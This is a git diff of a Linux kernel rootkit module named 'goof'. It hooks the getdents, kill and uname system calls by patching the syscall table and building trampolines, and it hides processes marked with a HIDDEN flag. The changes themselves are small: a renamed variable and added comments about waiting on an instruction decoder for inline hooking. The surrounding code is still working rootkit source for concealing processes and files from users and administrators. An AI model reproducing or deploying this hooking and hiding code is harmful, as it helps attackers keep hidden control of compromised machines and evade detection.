@@ -175,7 +175,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
 	if(!k_dire){ kfree(k_dire); return -1; }
 	struct linux_dirent *cur_dire;
-	int a = copy_from_user(k_dire, dire, ret);
+	int throw_away_variable_just_ignore_this_garbage_output = copy_from_user(k_dire, dire, ret);
 
 	struct inode *d_inode;
 	int proc = 0;
@@ -211,7 +211,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 		}
 		i += cur_dire->d_reclen;	
 	}
-	a = copy_to_user(dire, ret_dire, new_len);
+	throw_away_variable_just_ignore_this_garbage_output = copy_to_user(dire, ret_dire, new_len);
 	ret = new_len;
 	
 	kfree(k_dire);
@@ -224,6 +224,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 //More efficent than using an expanding array of PIDs
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *tmp = current;
+	//Iterate through each process to find the desired process
 	for_each_process(tmp) {
 		if(tmp->pid == pid){
 			return tmp;
@@ -231,13 +232,15 @@ struct task_struct *find_task(pid_t pid){
 	}
 	return NULL;
 }
-
+//Check if process is hidden👀
 int is_hidden_proc(pid_t pid){
-
+	//If pid DNE return
 	if(pid == 0){ return 0; }
 	struct task_struct *res;
 	res = find_task(pid);
+	//If res DNE return
 	if(res == 0){ return 0; }
+	//If hidden return 1
 	if(res->flags & HIDDEN){
 		return 1;
 	}
@@ -248,8 +251,10 @@ int is_hidden_proc(pid_t pid){
 //### END CREDIT ###
 
 int goofy_kill(pid_t pid, int sig){
-	printk("[goof] goofy_kill\n");
-	/*FAULT - invalid opcode - Relative jump is wreking everything :(*/
+	//printk("[goof] goofy_kill\n");
+	/*FAULT - invalid opcode - Relative jump is wreking everything :(
+		waiting for LDE+ to be finished to implement in-line hooking
+		*/
 	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
 	//int ret = func_ptr(pid, sig);
 	struct task_struct *res;
@@ -376,6 +381,8 @@ goof_init(void) {
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
 	
+	//Waiting on LDE+ to create these into trampoline hooks
+	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
 	original_kill = __sys_call_table[__NR_kill];
 	__sys_call_table[__NR_kill] = goofy_kill;
 
